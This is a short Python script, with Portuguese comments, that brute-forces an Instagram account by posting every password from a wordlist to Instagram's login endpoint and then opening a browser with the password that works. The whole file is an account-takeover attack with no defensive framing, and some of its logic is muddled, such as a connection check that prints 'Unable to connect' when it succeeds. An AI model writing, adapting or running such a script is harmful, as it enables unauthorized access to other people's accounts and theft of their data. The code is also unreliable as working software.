import requests
import webbrowser
from time import sleep

def check_connection():
    try:
        response = requests.get('https://www.instagram.com/accounts/login/')
        if response.status_code == 200:
            print('Unable to connect to Instagram.')
            return True
        else:
            print('')
            return False
    except requests.exceptions.RequestException as e:
        print(f'Erro ao verificar conexão: {str(e)}')
        return False

def brute_force_instagram(username, wordlist_file):
    if check_connection():
        with open(wordlist_file, 'r', encoding='iso-8859-1', errors='ignore') as file:
            passwords = file.readlines()
            total_passwords = len(passwords)
            counter = 0
            for password in passwords:
                password = password.strip()
                counter += 1
                print(f'Tentativa {counter}/{total_passwords} - Senha: {password}')
                try:
                    response = requests.post('https://www.instagram.com/accounts/login/ajax/',
                                             data={'username': username, 'password': password},
                                             headers={'User-Agent': 'Mozilla/5.0'})
                    if response.status_code == 200 and 'authenticated' in response.text:
                        print(f'Password found: {password}')
                        open_instagram(username, password)
                        break
                    sleep(1)  # Aguarda 1 segundo entre as tentativas
                except requests.exceptions.RequestException as e:
                    print(f'Error trying password: {password} - {str(e)}')
    else:
        print('Unable to connect to Instagram.')

def open_instagram(username, password):
    url = f'https://www.instagram.com/accounts/login/?username={username}&password={password}'
    webbrowser.open(url)

# Change the username and wordlist
username = 'profile'
wordlist_file = 'rockme.txt'
brute_force_instagram(username, wordlist_file)
